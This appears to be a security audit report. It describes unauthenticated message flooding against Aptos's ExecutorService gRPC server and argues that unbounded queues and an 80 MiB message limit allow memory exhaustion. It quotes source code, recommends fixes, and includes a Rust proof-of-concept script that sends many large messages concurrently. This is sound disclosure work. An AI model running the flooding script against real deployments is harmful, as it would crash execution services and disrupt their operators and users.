# Audit Report

## Title
Memory Exhaustion via Unauthenticated Message Flooding in ExecutorService

## Summary
The ExecutorService accepts incoming gRPC messages without authentication and queues them in unbounded channels, allowing any network peer to exhaust memory by sending multiple large messages (up to 80 MiB each) concurrently, causing service crashes and execution disruption.

## Finding Description

The ExecutorService is designed for distributed sharded execution in Aptos. It uses a NetworkController with a gRPC-based message service to receive execution commands from a coordinator and cross-shard messages from other executor shards.

**Security Guarantees Broken:**

1. **No Authentication**: The gRPC service accepts messages from any remote address without validation. [1](#0-0) 

The `simple_msg_exchange` handler extracts `remote_addr` but performs no authentication, authorization, or peer validation before forwarding messages to registered handlers.

2. **Large Message Size Limit**: Each message can be up to 80 MiB. [2](#0-1) [3](#0-2) 

While this limit prevents individual messages from being arbitrarily large, 80 MiB per message is substantial.

3. **Unbounded Message Queues**: Both inbound and outbound channels use `unbounded()` with no backpressure. [4](#0-3) [5](#0-4) 

Messages queue indefinitely until processed, with no limit on queue depth.

4. **Full Message Deserialization**: Incoming messages are fully deserialized into memory structures. [6](#0-5) 

The BCS deserialization allocates memory for the entire message content.

**Attack Flow:**

1. Attacker discovers ExecutorService endpoint (configured via command-line arguments) [7](#0-6) 

2. Attacker establishes multiple concurrent gRPC connections (no connection limit configured) [8](#0-7) 

3. Attacker sends many `RemoteExecutionRequest::ExecuteBlock` messages with maximum size (80 MiB) concurrently across multiple connections

4. Messages are accepted without authentication and queued in unbounded channels

5. Memory exhausts from accumulated messages in queues plus deserialized data structures

6. ExecutorService crashes or becomes unresponsive, disrupting sharded execution

## Impact Explanation

**Severity: High** (Validator node slowdowns / API crashes)

This vulnerability enables an unprivileged network attacker to crash or severely degrade the ExecutorService, which is critical infrastructure for parallel transaction execution in Aptos. 

- **Availability Impact**: ExecutorService crashes disrupt the coordinator's ability to perform sharded execution, degrading transaction processing throughput
- **No Privileges Required**: Any entity with network access to the service endpoint can exploit this
- **Resource Exhaustion**: Violates invariant #9 "Resource Limits - All operations must respect gas, storage, and computational limits"

While the primary Aptos validator nodes use the main network framework with authentication [9](#0-8) , the ExecutorService uses a simpler gRPC-based system without such protections.

## Likelihood Explanation

**Likelihood: High**

- **Attack Complexity**: Low - standard gRPC client libraries can be used
- **Attacker Requirements**: Only network connectivity to the service endpoint
- **Detection Difficulty**: Moderate - looks like legitimate traffic until resource exhaustion occurs
- **Deployment Reality**: ExecutorService endpoints are configured via command-line with SocketAddr, potentially exposing them to network attackers

## Recommendation

Implement multi-layered defenses:

1. **Add Authentication**: Implement mutual TLS or shared secret authentication to verify remote peer identity before processing messages

2. **Use Bounded Channels**: Replace `unbounded()` with bounded channels (e.g., `bounded(1000)`) to enforce backpressure

3. **Add Connection Limits**: Configure `Server::builder()` with concurrent connection limits via `http2_max_concurrent_streams()`

4. **Implement Rate Limiting**: Add per-peer message rate limiting to prevent flooding

5. **Reduce Message Size Limit**: Consider reducing MAX_MESSAGE_SIZE from 80 MiB to a smaller value (e.g., 16 MiB) if feasible for the execution workload

Example fix for bounded channels:
```rust
// In network_controller/mod.rs
pub fn create_inbound_channel(&mut self, message_type: String) -> Receiver<Message> {
    let (inbound_sender, inbound_receiver) = bounded(1000); // Add capacity limit
    // ... rest of implementation
}
```

## Proof of Concept

```rust
// File: executor_service_dos_poc.rs
use aptos_protos::remote_executor::v1::{
    network_message_service_client::NetworkMessageServiceClient, NetworkMessage,
};
use std::time::Duration;
use tokio::time::sleep;
use tonic::transport::Channel;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Target ExecutorService endpoint (example: 127.0.0.1:50051)
    let endpoint = "http://127.0.0.1:50051";
    
    // Create client
    let mut client = NetworkMessageServiceClient::connect(endpoint)
        .await?
        .max_decoding_message_size(80 * 1024 * 1024);
    
    // Send many large messages concurrently
    let mut handles = vec![];
    for i in 0..100 {
        let mut client_clone = client.clone();
        let handle = tokio::spawn(async move {
            // Create a large message (70 MiB)
            let large_payload = vec![0u8; 70 * 1024 * 1024];
            let message = NetworkMessage {
                message: large_payload,
                message_type: format!("execute_command_0"),
            };
            
            // Send repeatedly
            for j in 0..10 {
                match client_clone.simple_msg_exchange(message.clone()).await {
                    Ok(_) => println!("Connection {}, Message {} sent", i, j),
                    Err(e) => println!("Connection {}, Message {} failed: {}", i, j, e),
                }
                sleep(Duration::from_millis(10)).await;
            }
        });
        handles.push(handle);
    }
    
    // Wait for all tasks
    for handle in handles {
        handle.await?;
    }
    
    Ok(())
}
```

**Expected Outcome**: The ExecutorService will accumulate messages in unbounded queues, memory usage will grow rapidly, and the service will eventually crash with OOM or become unresponsive.

## Notes

The main Aptos network framework (in `network/framework/`) implements robust authentication using Noise protocol handshakes and trusted peer validation. However, the ExecutorService uses a separate, simpler gRPC-based NetworkController (in `secure/net/`) that lacks these security mechanisms. This architectural decision creates an attack surface for unauthenticated remote execution services.

While messages are bounded at 80 MiB per message, the lack of authentication combined with unbounded queues allows memory exhaustion through message accumulation rather than through individual message size.

### Citations

**File:** secure/net/src/grpc_network_service/mod.rs (L23-23)
```rust
const MAX_MESSAGE_SIZE: usize = 1024 * 1024 * 80;
```

**File:** secure/net/src/grpc_network_service/mod.rs (L75-86)
```rust
        Server::builder()
            .timeout(std::time::Duration::from_millis(rpc_timeout_ms))
            .add_service(
                NetworkMessageServiceServer::new(self).max_decoding_message_size(MAX_MESSAGE_SIZE),
            )
            .add_service(reflection_service)
            .serve_with_shutdown(server_addr, async {
                server_shutdown_rx.await.ok();
                info!("Received signal to shutdown server at {:?}", server_addr);
            })
            .await
            .unwrap();
```

**File:** secure/net/src/grpc_network_service/mod.rs (L93-115)
```rust
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
```

**File:** secure/net/src/network_controller/mod.rs (L120-120)
```rust
        let (outbound_sender, outbound_receiver) = unbounded();
```

**File:** secure/net/src/network_controller/mod.rs (L129-129)
```rust
        let (inbound_sender, inbound_receiver) = unbounded();
```

**File:** execution/executor-service/src/remote_cordinator_client.rs (L89-89)
```rust
                let request: RemoteExecutionRequest = bcs::from_bytes(&message.data).unwrap();
```

**File:** execution/executor-service/src/main.rs (L9-25)
```rust
#[derive(Debug, Parser)]
struct Args {
    #[clap(long, default_value_t = 8)]
    pub num_executor_threads: usize,

    #[clap(long)]
    pub shard_id: usize,

    #[clap(long)]
    pub num_shards: usize,

    #[clap(long, num_args = 1..)]
    pub remote_executor_addresses: Vec<SocketAddr>,

    #[clap(long)]
    pub coordinator_address: SocketAddr,
}
```

**File:** network/framework/src/noise/handshake.rs (L1-50)
```rust
// Copyright (c) Aptos Foundation
// Licensed pursuant to the Innovation-Enabling Source Code License, available at https://github.com/aptos-labs/aptos-core/blob/main/LICENSE

//! The handshake module implements the handshake part of the protocol.
//! This module also implements additional anti-DoS mitigation,
//! by including a timestamp in each handshake initialization message.
//! Refer to the module's documentation for more information.
//! A successful handshake returns a [`NoiseStream`] which is defined in the
//! [stream] module.
//!
//! [stream]: crate::noise::stream

use crate::{
    application::storage::PeersAndMetadata,
    logging::NetworkSchema,
    noise::{error::NoiseHandshakeError, stream::NoiseStream},
};
use aptos_config::{
    config::{Peer, PeerRole},
    network_id::{NetworkContext, NetworkId},
};
use aptos_crypto::{noise, x25519};
use aptos_infallible::{duration_since_epoch, RwLock};
use aptos_logger::{error, trace};
use aptos_short_hex_str::{AsShortHexStr, ShortHexStr};
use aptos_types::PeerId;
use futures::io::{AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt};
use std::{collections::HashMap, convert::TryFrom as _, fmt::Debug, sync::Arc};

/// In a mutually authenticated network, a client message is accompanied with a timestamp.
/// This is in order to prevent replay attacks, where the attacker does not know the client's static key,
/// but can still replay a handshake message in order to force a peer into performing a few Diffie-Hellman key exchange operations.
///
/// Thus, to prevent replay attacks a responder will always check if the timestamp is strictly increasing,
/// effectively considering it as a stateful counter.
///
/// If the client timestamp has been seen before, or is not strictly increasing,
/// we can abort the handshake early and avoid heavy Diffie-Hellman computations.
/// If the client timestamp is valid, we store it.
#[derive(Default)]
pub struct AntiReplayTimestamps(HashMap<x25519::PublicKey, u64>);

impl AntiReplayTimestamps {
    /// The timestamp is sent as a payload, so that it is encrypted.
    /// Note that a millisecond value is a 16-byte value in rust,
    /// but as we use it to store a duration since UNIX_EPOCH we will never use more than 8 bytes.
    pub const TIMESTAMP_SIZE: usize = 8;

    /// obtain the current timestamp
    pub fn now() -> [u8; Self::TIMESTAMP_SIZE] {
```
